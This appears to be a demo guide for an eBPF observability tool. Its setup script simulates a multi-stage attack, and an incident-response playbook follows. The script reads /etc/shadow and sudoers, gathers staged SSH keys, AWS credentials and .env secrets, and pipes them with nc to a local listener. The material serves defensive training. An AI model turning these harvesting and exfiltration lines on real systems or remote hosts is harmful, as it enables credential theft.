# 🔴 Demo 05 — "Full Incident Response: The data exfiltration"

**Difficulty:** Hard  
**Category:** Full-spectrum incident response  
**Estimated setup:** 5 minutes  
**Godshell tools exercised:** ALL 14 tools in a single investigation

---

## Scenario

A multi-stage attack is happening on your system **right now**:

1. **Stage 1 — Recon**: A script enumerates users, reads `/etc/passwd`,
   checks `sudo` configuration, and harvests shell histories.
2. **Stage 2 — Credential Theft**: It reads cloud config files (`~/.aws/credentials`),
   SSH keys, and `.env` files from projects.
3. **Stage 3 — Exfiltration**: A separate process compresses and
   exfiltrates the stolen data over an encrypted HTTPS-like connection
   (simulated on a local port).
4. **Stage 4 — Persistence**: A cron-like process is installed that
   re-runs periodically, touching systemd paths.

You need Godshell to reconstruct the entire kill chain using only its
built-in observability — **no external forensic tools needed**.

---

## Setup Script

```bash
#!/usr/bin/env bash
# demos/setup_05_full_incident.sh
# Multi-stage attack simulation for full Godshell incident response
# Everything is LOCAL and SAFE — no real data leaves the machine

set -e

STAGING_DIR=$(mktemp -d /tmp/godshell_incident_XXXX)
EXFIL_PORT=8443

echo "🚨 Full incident response demo — 4-stage attack simulation"
echo "   Staging directory: $STAGING_DIR"
echo ""

# ─── Fake sensitive files ───────────────────────────────────────────────

mkdir -p "$STAGING_DIR/home/victim/.ssh"
mkdir -p "$STAGING_DIR/home/victim/.aws"
mkdir -p "$STAGING_DIR/home/victim/projects/webapp"
mkdir -p "$STAGING_DIR/loot"

cat > "$STAGING_DIR/home/victim/.ssh/id_rsa" << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
FAKE_KEY_FOR_DEMO_PURPOSES_ONLY_NOT_REAL
-----END OPENSSH PRIVATE KEY-----
EOF

cat > "$STAGING_DIR/home/victim/.aws/credentials" << 'EOF'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1

[production]
aws_access_key_id = AKIAI44QH8DHBEXAMPLE
aws_secret_access_key = je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
region = us-west-2
EOF

cat > "$STAGING_DIR/home/victim/projects/webapp/.env" << 'EOF'
DATABASE_URL=postgres://admin:P@ssw0rd!@prod-db.internal:5432/maindb
STRIPE_SECRET_KEY=sk_live_FAKE_4eC39HqLyjWDarjtT1zdp7dc
JWT_SECRET=super-secret-jwt-key-that-should-be-rotated
REDIS_URL=redis://:authpassword@cache.internal:6379
SENDGRID_API_KEY=SG.FAKE_KEY.DEMO_ONLY
EOF

echo "[+] Sensitive files staged"

# ─── Stage 0: Start the exfil listener ──────────────────────────────────

echo "[*] Starting exfiltration listener on port $EXFIL_PORT..."
(while true; do ncat -l -p $EXFIL_PORT -w 5 > /dev/null 2>&1; done) &
EXFIL_LISTENER_PID=$!
sleep 1

# ─── Stage 1: Reconnaissance ───────────────────────────────────────────

echo "[*] Stage 1: Recon..."
(
  # Enumerate system
  cat /etc/passwd > /dev/null 2>&1
  cat /etc/shadow > /dev/null 2>&1    # Will fail (no root), but generates event
  cat /etc/sudoers > /dev/null 2>&1   # Same
  cat /etc/hosts > /dev/null 2>&1
  whoami > /dev/null
  id > /dev/null
  uname -a > /dev/null

  # Check for interesting binaries
  which docker > /dev/null 2>&1 || true
  which kubectl > /dev/null 2>&1 || true
  which aws > /dev/null 2>&1 || true

  # Read home directories
  ls /home/ > /dev/null 2>&1 || true

  sleep 999
) &
RECON_PID=$!

# ─── Stage 2: Credential Theft ─────────────────────────────────────────

echo "[*] Stage 2: Credential theft..."
(
  sleep 3  # Wait for recon to finish

  # Steal SSH keys
  cat "$STAGING_DIR/home/victim/.ssh/id_rsa" > "$STAGING_DIR/loot/ssh_key.txt"

  # Steal AWS credentials
  cat "$STAGING_DIR/home/victim/.aws/credentials" > "$STAGING_DIR/loot/aws_creds.txt"

  # Steal application secrets
  cat "$STAGING_DIR/home/victim/projects/webapp/.env" > "$STAGING_DIR/loot/app_env.txt"

  # Create a manifest of what was stolen
  echo "=== LOOT MANIFEST ===" > "$STAGING_DIR/loot/manifest.txt"
  echo "SSH Key: OBTAINED" >> "$STAGING_DIR/loot/manifest.txt"
  echo "AWS Creds: 2 profiles" >> "$STAGING_DIR/loot/manifest.txt"
  echo "App Secrets: DATABASE_URL, STRIPE, JWT" >> "$STAGING_DIR/loot/manifest.txt"
  echo "Timestamp: $(date -u)" >> "$STAGING_DIR/loot/manifest.txt"

  sleep 999
) &
STEAL_PID=$!

# ─── Stage 3: Exfiltration ─────────────────────────────────────────────

echo "[*] Stage 3: Exfiltration..."
(
  sleep 8  # Wait for credential theft

  # Compress the loot
  cd "$STAGING_DIR"
  tar czf "$STAGING_DIR/loot.tar.gz" loot/ 2>/dev/null

  # "Exfiltrate" to the local listener
  while true; do
    cat "$STAGING_DIR/loot.tar.gz" | nc -w 2 127.0.0.1 $EXFIL_PORT 2>/dev/null || true
    sleep 15  # Re-exfil periodically
  done
) &
EXFIL_PID=$!

# ─── Stage 4: Persistence ──────────────────────────────────────────────

echo "[*] Stage 4: Persistence..."
(
  sleep 5
  # Try to read systemd paths (generates events even if it fails)
  cat /etc/crontab > /dev/null 2>&1 || true
  ls /etc/cron.d/ > /dev/null 2>&1 || true
  ls /etc/systemd/system/ > /dev/null 2>&1 || true
  ls "$HOME/.config/systemd/user/" > /dev/null 2>&1 || true

  # Create a fake persistence script
  cat > "$STAGING_DIR/updater.sh" << 'PERSIST'
#!/bin/bash
# "Legitimate system updater" — actually re-runs the attack
while true; do
  sleep 3600
  /tmp/godshell_incident_*/loot.tar.gz  # Will fail, but the attempt is logged
done
PERSIST
  chmod +x "$STAGING_DIR/updater.sh"

  sleep 999
) &
PERSIST_PID=$!

echo ""
echo "╔═════════════════════════════════════════════════════════════════════╗"
echo "║  🚨 FULL INCIDENT SIMULATION ACTIVE                               "
echo "║                                                                     "
echo "║  Stage 1 — Recon:        PID $RECON_PID                            "
echo "║  Stage 2 — Cred Theft:   PID $STEAL_PID                            "
echo "║  Stage 3 — Exfil:        PID $EXFIL_PID (→ port $EXFIL_PORT)       "
echo "║  Stage 4 — Persistence:  PID $PERSIST_PID                          "
echo "║  Exfil Listener:         PID $EXFIL_LISTENER_PID                    "
echo "║  Staging Dir:            $STAGING_DIR                               "
echo "║                                                                     "
echo "║  ── Investigation Playbook ──────────────────────────────────────── "
echo "║                                                                     "
echo "║  PHASE 1: Triage                                                    "
echo "║  > give me a full system summary                                    "
echo "║  > are there any suspicious processes or connections?               "
echo "║                                                                     "
echo "║  PHASE 2: Deep Dive                                                 "
echo "║  > inspect PID $RECON_PID — what files has it been reading?         "
echo "║  > inspect PID $STEAL_PID — what's this process doing?             "
echo "║  > what is PID $EXFIL_PID connecting to?                            "
echo "║                                                                     "
echo "║  PHASE 3: Evidence Collection                                       "
echo "║  > read the loot manifest file                                      "
echo "║  > extract strings from the persistence script                      "
echo "║  > what environment variables does the exfil process have?          "
echo "║  > hash the binaries involved                                       "
echo "║  > read the memory of the credential stealer                        "
echo "║  > trace the syscalls of the exfiltration process                   "
echo "║                                                                     "
echo "║  PHASE 4: Kill Chain Reconstruction                                 "
echo "║  > show all process family trees involved                           "
echo "║  > what user's shell history shows the initial compromise?          "
echo "║  > reconstruct the full attack timeline                             "
echo "║                                                                     "
echo "║  To clean up:                                                       "
echo "║  kill $RECON_PID $STEAL_PID $EXFIL_PID $PERSIST_PID $EXFIL_LISTENER_PID"
echo "║  rm -rf $STAGING_DIR                                                "
echo "╚═════════════════════════════════════════════════════════════════════╝"
echo ""

wait
```

---

## Investigation Playbook

### Phase 1 — Triage (tools: `summary`, `search`)

| #   | Prompt                                                      | What to Look For                                            |
| --- | ----------------------------------------------------------- | ----------------------------------------------------------- |
| 1   | `give me a complete system summary`                         | Multiple bash processes with unusual file activity patterns |
| 2   | `search for any process reading /etc/passwd or /etc/shadow` | Stage 1 recon process immediately flagged                   |
| 3   | `are there outbound connections on unusual ports?`          | Port 8443 exfil connection surfaces                         |

### Phase 2 — Deep Dive (tools: `inspect`, `family`, `gonetwork_state`)

| #   | Prompt                                            | What to Look For                                    |
| --- | ------------------------------------------------- | --------------------------------------------------- |
| 4   | `inspect the process reading /etc/passwd`         | Recon script — reads passwd, shadow, sudoers, hosts |
| 5   | `inspect the process connected to port 8443`      | Exfil process — `nc` sending compressed data        |
| 6   | `show the full family tree for the exfil process` | Links all 4 stages to the same parent script        |
| 7   | `show network state for the exfil process`        | ESTABLISHED connection, data flowing out            |

### Phase 3 — Evidence Collection (tools: `read_file`, `goextract_strings`, `goread_environ`, `gohash_binary`, `read_memory`, `trace`, `get_maps`, `get_libraries`)

| #   | Prompt                                           | Evidence Gathered                                              |
| --- | ------------------------------------------------ | -------------------------------------------------------------- |
| 8   | `read the loot manifest file`                    | Shows exactly what was stolen: SSH key, AWS creds, app secrets |
| 9   | `read the .env file that was stolen`             | Full database credentials, API keys exposed                    |
| 10  | `extract strings from the persistence script`    | Reveals the re-attack mechanism                                |
| 11  | `show the environment of the credential stealer` | Any inherited secrets or attacker configuration                |
| 12  | `hash the binaries of all involved processes`    | Forensic evidence for IOC (Indicators of Compromise)           |
| 13  | `read the memory of the credential stealer`      | May reveal in-memory secrets being processed                   |
| 14  | `trace the exfil process for 5 seconds`          | Shows write syscalls to the network socket                     |
| 15  | `show the memory layout of the exfil process`    | Reveals loaded libraries and memory regions                    |

### Phase 4 — Kill Chain Reconstruction (tools: `family`, `goread_shell_history`)

| #   | Prompt                                                               |
| --- | -------------------------------------------------------------------- |
| 16  | `reconstruct the complete attack timeline from what you've observed` |
| 17  | `which user account was compromised? check shell histories`          |
| 18  | `summarize all indicators of compromise you've found`                |

---

## Expected Outcome

Godshell should be able to reconstruct the **complete MITRE ATT&CK kill chain**:

| MITRE Phase           | Demo Stage | Evidence Godshell Finds                                     |
| --------------------- | ---------- | ----------------------------------------------------------- |
| **Reconnaissance**    | Stage 1    | `openat` events on `/etc/passwd`, `/etc/shadow`, `sudoers`  |
| **Credential Access** | Stage 2    | File reads on SSH keys, AWS credentials, `.env` files       |
| **Collection**        | Stage 2→3  | Loot manifest, `tar` compression of stolen files            |
| **Exfiltration**      | Stage 3    | Outbound TCP to port 8443, data transfer visible            |
| **Persistence**       | Stage 4    | Reads of `crontab`, systemd paths, creation of `updater.sh` |

All discovered **without running a single diagnostic command** externally.
The eBPF observer captured everything as it happened.

---

## Cleanup

```bash
# Kill all attack stages
kill %1 %2 %3 %4 %5 2>/dev/null

# Remove staging directory
rm -rf /tmp/godshell_incident_*
```
